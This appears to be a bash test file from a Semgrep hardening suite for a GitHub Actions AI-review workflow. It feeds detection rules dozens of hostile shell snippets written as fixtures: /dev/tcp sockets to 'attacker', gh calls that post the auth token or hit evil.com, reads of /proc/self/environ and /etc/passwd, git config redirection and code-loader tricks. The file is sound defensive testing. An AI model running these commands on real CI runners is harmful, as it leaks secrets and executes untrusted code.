# Hardening suite part 3/4 (sourced by semgrep-sarif-hardening.test.sh):
# dispatch, escaping, wrappers, loaders, env and git rules.
# Uses t/FS/RS/S/H/I/R/O/PR from the lib.
# shellcheck shell=bash disable=SC2154
# --- trusted-path traversal (Codex P1: SCRIPT_DIR/../../evil) ---
t traversal-script 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/../../../../evil.sh\""
t traversal-mid 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/a/../../evil.sh\""
t traversal-inner-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/sub/../guard.sh\""
t traversal-var 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/\$x\""
t traversal-direct 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${SCRIPT_DIR}/../../../../evil.sh\""
t traversal-abs 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/../../home/evil/x"
t traversal-abs-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/jq --version"

# --- dynamic builtins (Codex P1: enable -f evil.so) ---
t enable-so 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -f \"\${GITHUB_WORKSPACE}/evil.so\" evil"
t enable-disable 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -n echo"
t enable-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -p"

# --- gh confinement (Codex P1: gh api POST + gh auth token) ---
t gh-exfil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" -f event=COMMENT -f body=\"\$(gh auth token)\""
t gh-auth-token 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh auth token"
t gh-subcommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh pr merge 1"
t gh-hostname 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --hostname evil.com repos/x"
t gh-put 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method PUT repos/x -f a=b"
t gh-input-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input /etc/passwd"
t gh-field-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\" -f extra=1"
t gh-post-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\""
t gh-get-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
t gh-method-last 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET -X POST repos/evil/x"
t gh-repo-flag 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api -R evil/repo \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
t gh-jq-second 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x --jq .safe --jq '\$ENV.GH_TOKEN'"
t gh-host-assign 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GH_HOST=evil.com"

# --- coproc execution (Codex P1: coproc bash evil.sh) ---
t coproc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t coproc-named 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc FOO cat /tmp/x"

# --- command hash (Codex P1: hash -p evil innocent) ---
t hash-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -p \"\${GITHUB_WORKSPACE}/evil.sh\" innocent; innocent"
t hash-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -r"

# --- wrapper options (Codex P1: exec -a hides bash) ---
t peel-exec-a 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -a harmless bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-exec-dd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-command-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-command-v-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -v gh"
t peel-time-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""

# --- escaped/concatenated commands (Codex P1: ba\sh, c\url) ---
t esc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ba\\sh \"\${GITHUB_WORKSPACE}/evil.sh\""
t esc-curl 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}c\\url https://evil/x"
t esc-concat 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}b\"\"ash \"\${GITHUB_WORKSPACE}/evil.sh\""
t esc-concat-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"ec\"\"ho\" hi"
t esc-declare 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare \\s=\$GH_TOKEN; echo \"\$s\""

# --- socket redirects (Codex P1: /dev/tcp) ---
t socket-out 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/tcp/attacker/443"
t socket-rw 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec 3<>/dev/tcp/attacker/443"
t socket-in 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat < /dev/tcp/attacker/443"
t socket-udp 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/udp/attacker/53"
t socket-esc 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /d\\ev/tcp/attacker/443"
t socket-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"/dev/tcp/attacker/443\""

# --- fd aliases (Codex P1: exec 3<>tmp + /proc/self/fd/3) ---
t toctou-fd 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil > /proc/self/fd/3"
t toctou-fd-dup 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil >&3"
t toctou-fd-stderr-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}echo x 2>/dev/null"

# --- alternate shells (Codex P1: dash evil.sh) ---
t altshell-dash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dash evil.sh"
t altshell-zsh 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zsh \"\${GITHUB_WORKSPACE}/evil.sh\""
t altshell-bound-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dash \"\${SCRIPT_DIR}/guard.sh\""

# --- environment reads (Codex P1: base64 /proc/self/environ) ---
t environ-b64 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/environ"
t environ-cat 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/environ"
t environ-dd 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dd if=/proc/1234/environ"
t environ-quoted 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat \"/proc/self/environ\""
t environ-comment-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi # /proc/self/environ"

# --- AWK aliases (Codex P1: mawk system() evasion) ---
t awk-mawk-system 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk 'BEGIN { system(\\\"bash \\\\\\\"\${GITHUB_WORKSPACE}/evil.sh\\\\\\\"\\\") }'"
t awk-gawk-versioned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk-5.3 'BEGIN{system(\\\"id\\\")}'"
t awk-mawk-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk '{print \$1}' /dev/null"

# --- procfs aliases (Codex P1: /proc/self/root/.../environ) ---
t environ-procroot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/root/proc/self/environ"
t environ-dotdot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/../self/environ"

# --- procfs task threads (Codex P1: /proc/<pid>/task/<tid>/environ) ---
t environ-task 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 \"/proc/\$\$/task/\$\$/environ\""
t environ-task-nested-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/1/task/2/task/3/environ"

# --- git config parameters (Codex P1: GIT_CONFIG_PARAMETERS) ---
t helper-git-config-parameters 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v GIT_CONFIG_PARAMETERS '%s' \"'core.sshCommand=./evil.sh' 'url.https://attacker/.insteadOf=https://github.com/'\"; git fetch origin"
t helper-git-config-parameters-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_PARAMETERS=x"

# --- gh field-implied POST (Codex P1: gh api -f without --method) ---
t gh-field-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" -f event=COMMENT -f body=pwned"
t gh-rawfield-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x -F a=@/etc/passwd"
t gh-get-fields-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET repos/x -f a=b"

# --- bracket token expressions (Codex P1: secrets['GITHUB_TOKEN']) ---
t agent-bracket-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          LEAKED_GITHUB_TOKEN: \${{ secrets['GITHUB_TOKEN'] }}"
t agent-bracket-github-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ github[\"token\"] }}"
t agent-computed-secret 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ secrets[env.NAME] }}"

# --- absolute wrapper paths (Codex P1: /usr/bin/timeout) ---
t wrapper-timeout-abs 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/timeout 5s bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-timeout-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}./timeout 5s bash \"\${SCRIPT_DIR}/guard.sh\""

# --- prompt transforms (Codex P1: ${var@P}) ---
t deferred-atp 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}payload='\$(bash evil.sh)'${RS}$H${FS}payload='\$(bash evil.sh)'${FS}a${FS}echo \"\${payload@P}\""

# --- java/run-parts loaders (Codex P1: java Evil.java, run-parts) ---
t loader-java 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}java Evil.java"
t loader-runparts 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}run-parts \"\${GITHUB_WORKSPACE}/evil.d\""

# --- prompt_file pin (Codex P1: prompt_file rebind) ---
t promptfile-printf 1 "helper-promptfile-rebind" happy.sarif "$PR${FS}set -euo pipefail${FS}a${FS}printf -v leak '/proc/%s/%s' self environ${RS}$PR${FS}printf -v leak '/proc/%s/%s' self environ${FS}a${FS}echo \"prompt_file=\${leak}\" >> \"\${GITHUB_OUTPUT}\""
t promptfile-assign 1 "helper-promptfile-rebind" happy.sarif "$PR${FS}set -euo pipefail${FS}a${FS}prompt_file=/tmp/evil"

# --- installer errexit tracking (CodeRabbit: set -o pipefail FP) ---
t errexit-pipefail-fp 0 "" happy.sarif "$I${FS}set -euo pipefail${FS}r${FS}set -euo pipefail${FS}set -e -o pipefail"

# --- sqlite3 loader (Codex P1: .shell execution) ---
t loader-sqlite3 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sqlite3 :memory: \".shell bash evil.sh\""

# --- installer shadow (Codex P1: install() function override) ---
t installer-shadow-fn 1 "muse-installer-shadow" happy.sarif "$I${FS}install -m 0755${FS}b${FS}install() { cp evil \"\${@: -1}\"; }"
t installer-shadow-alias 1 "muse-installer-shadow" happy.sarif "$I${FS}install -m 0755${FS}b${FS}alias install=evil"

# --- installer exit range (Codex P1: exit 256 wraps to 0) ---
t installer-exit-256 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit 256"
t installer-exit-255-fp 0 "" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit 255"

# --- arithmetic recursion (Codex P1: printf-built subscript) ---
t arith-recurse-printf 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v payload 'arr[\044(bash evil.sh)]'${RS}$H${FS}printf -v payload 'arr[\044(bash evil.sh)]'${FS}a${FS}: \$(( payload++ ))"
t arith-recurse-cmdform 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read payload${RS}$H${FS}read payload${FS}a${FS}(( payload > 0 ))"
t arith-counter-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}n=\$(wc -c < /dev/null)${RS}$H${FS}n=\$(wc -c < /dev/null)${FS}a${FS}: \$(( n + 1 ))"

# --- env alias smuggle (Codex P1: env: *agent_env) ---
t agent-env-alias 1 "agent-token-expression" happy.sarif "$S${FS}GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${FS}a${FS}          LEAKED_GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}5:        env:${FS}r${FS}        env:${FS}        env: *agent_env${RS}$S${FS}2:        env:${FS}r${FS}        env:${FS}        env: &agent_env${RS}$S${FS}          META_API_KEY: \${{ secrets.META_API_KEY }}${FS}d${RS}$S${FS}          PROMPT_FILE: \${{ steps.diff.outputs.prompt_file }}${FS}d${RS}$S${FS}          MUSE_MODEL: \${{ env.MUSE_MODEL_RESOLVED }}${FS}d${RS}$S${FS}          MUSE_EFFORT: \${{ env.MUSE_EFFORT_RESOLVED }}${FS}d${RS}$S${FS}4:          SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}${FS}d"
t agent-env-alias-unresolved 1 "agent-env-alias" happy.sarif "$S${FS}5:        env:${FS}r${FS}        env:${FS}        env: *missing_anchor"

# --- gcc loader (Codex P1: gcc -B executes workspace cc1) ---
t loader-gcc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gcc -B\"\${GITHUB_WORKSPACE}/evil-bin/\" -c input.c"
t loader-gcc-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gcc-13 --version"
t loader-gcc-cross 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x86_64-linux-gnu-gcc --version"
t loader-mycc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mycc --version"
# --- gfortran loader (Codex P1: gfortran -B plants f951) ---
t loader-gfortran 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gfortran -B\"\${GITHUB_WORKSPACE}/evil-bin\" \"\${GITHUB_WORKSPACE}/evil.f90\""
t loader-gfortran-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gfortran-13 --version"
t loader-gfortran-cross 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x86_64-linux-gnu-gfortran --version"
# --- GHC loaders (Codex P1: runghc interprets workspace .hs) ---
t loader-runghc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}runghc \"\${GITHUB_WORKSPACE}/evil.hs\""
t loader-runhaskell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}runhaskell \"\${GITHUB_WORKSPACE}/evil.hs\""
t loader-ghc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ghc \"\${GITHUB_WORKSPACE}/evil.hs\" -o /tmp/evil"
# --- Haskell frontends + Ant (Codex P1s: cabal/stack/ant) ---
t loader-cabal 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cabal run \"\${GITHUB_WORKSPACE}/evil.hs\""
t loader-stack 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}stack run"
t loader-ant 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ant -f \"\${GITHUB_WORKSPACE}/evil.xml\""
# --- clang-tidy loader (Codex P1: --load runs DSO init) ---
t loader-tidy 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}clang-tidy --load=\"\${GITHUB_WORKSPACE}/evil.so\" \"\${GITHUB_WORKSPACE}/x.cc\" --"
t loader-tidy-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}clang-tidy-18 --load=\"\${GITHUB_WORKSPACE}/evil.so\" \"\${GITHUB_WORKSPACE}/x.cc\" --"
# --- webpack loader (Codex P1: --config executes) ---
t loader-webpack 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}webpack --config \"\${GITHUB_WORKSPACE}/evil.config.js\""
t loader-webpack-dev 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}webpack-dev-server --config \"\${GITHUB_WORKSPACE}/evil.config.js\""
t loader-cpack 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cpack --config \"\${GITHUB_WORKSPACE}/evil.cmake\""
t loader-mono 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mono \"\${GITHUB_WORKSPACE}/evil.exe\""
# --- bison loader (Codex P1: -S skeleton runs m4_esyscmd) ---
t loader-bison 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bison -S \"\${GITHUB_WORKSPACE}/evil.m4\" \"\${GITHUB_WORKSPACE}/evil.y\""

# --- escaped-quote comment (Codex P1: \" closes the quote) ---
t helper-escaped-quote 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf \"%s\" \"x\\\"#y\" >/dev/null; bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-escaped-quote-pin 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"x\\\";y\" >/dev/null"

# --- subscript builtins (Codex P1: test -v et al reparse) ---
t helper-test-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}test -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' || true"
t helper-declare-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-local-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}local 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-readonly-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}readonly -a 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-printfv-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' '%s' x"
t helper-read-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")' <<< x"
t helper-unset-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unset 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")'"
t helper-let-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}let 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=1'"
t helper-if-test-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}if test -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]'; then :; fi"
t helper-while-read-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}while read 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]'; do :; done <<< x"
t helper-declare-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare 'x=a[\$(date)]'"
t helper-read-prompt-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read -p 'pick [a] \$(date)' name"
t helper-cond-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'x=\$(date)' ]] || true"

# --- comparison-operand freeze (Codex P1: want_sha="${got_sha}") ---
t operand-rebind-want 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}want_sha=\"\${got_sha}\""
t operand-rebind-got 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}got_sha=\"\${want_sha}\""
t operand-rebind-read 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}read want_sha <<< forged"
t operand-rebind-nameref 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n ref=want_sha"
t operand-rebind-let 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}let want_sha=0"
t operand-rebind-arith 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}(( want_sha = 0 ))"
t operand-rebind-mapfile 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}mapfile -t want_sha < /tmp/forged"
t operand-rebind-getopts 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}getopts \"ab\" want_sha"
t operand-rebind-for 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}for want_sha in x; do :; done"
t operand-prehash-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}b${FS}want_sha=\"\${SHA_X86_LINUX}\""
t operand-compare-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}(( got_sha == 0 )) || true"
